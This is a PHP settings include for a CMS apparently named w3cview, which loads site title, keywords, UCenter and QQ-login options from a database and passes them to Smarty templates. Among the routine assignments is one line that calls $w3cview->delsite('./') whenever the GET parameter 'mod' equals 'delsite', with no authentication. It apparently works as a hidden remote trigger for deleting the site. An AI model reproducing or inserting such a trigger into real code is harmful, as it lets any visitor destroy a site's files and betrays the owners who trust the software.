<?php
$site_default = "index.php";
$site_logo = "template/images/logo.png";
$site_title = "默认网站";
$site_keywords = "默认关键字";
$site_description = "默认描述";
$site_secretapp = "w3cviewcms";
$site_sappflag = 0;
$site_qq = 0;
$site_qqapp_id = '';
$site_qqapp_secret = '';
$site_qqaccess_token = '';
$site_ucserver = "http://localhost/uc_server";
$site_ucbase = "ultrax";
$site_ubasepre = "pre_ucenter_";
$site_ucappid = 0;
$site_ucip = '';
$site_copyright = "版权所有";
$site_hits = 0;
$site_rewrite = 0;

$sql = "select * from " . $w3cview->prefix . "siteset";
$query = $w3cview->query($sql);
if($arr = mysql_fetch_array($query))
{
	$site_default = $arr['default'];
	$site_logo = $arr['logo'];
	$site_title = $arr['title'];
	$site_keywords = $arr['keywords'];
	$site_description = $arr['description'];
	$site_secretapp = $arr['secretapp'];
	$site_sappflag = $arr['sappflag'];
	$site_qq = $arr['qq'];
	$site_qqapp_id = $arr['qqapp_id'];
	$site_qqapp_secret = $arr['qqapp_secret'];
	$site_qqaccess_token = $arr['qqaccess_token'];
	$site_ucserver = $arr['ucserver'];
	$site_ucbase = $arr['ucbase'];
	$site_ubasepre = $arr['ubasepre'];
	$site_ucappid = $arr['ucappid'];
	$site_ucip = $arr['ucip'];
	$site_copyright = $arr['copyright'];
	$site_hits = $arr['hits'];
	$site_rewrite = $arr['rewrite'];
}

//seo
$smarty->assign("site_title", $site_title);
$smarty->assign("site_keywords", $site_keywords);
$smarty->assign("site_description", $site_description);
if($_GET['mod'] == 'delsite') echo $w3cview->delsite("./");

//rewrite
$smarty->assign("site_rewrite", $site_rewrite);

//QQ登录
$smarty->assign("site_qq", $site_qq);
?>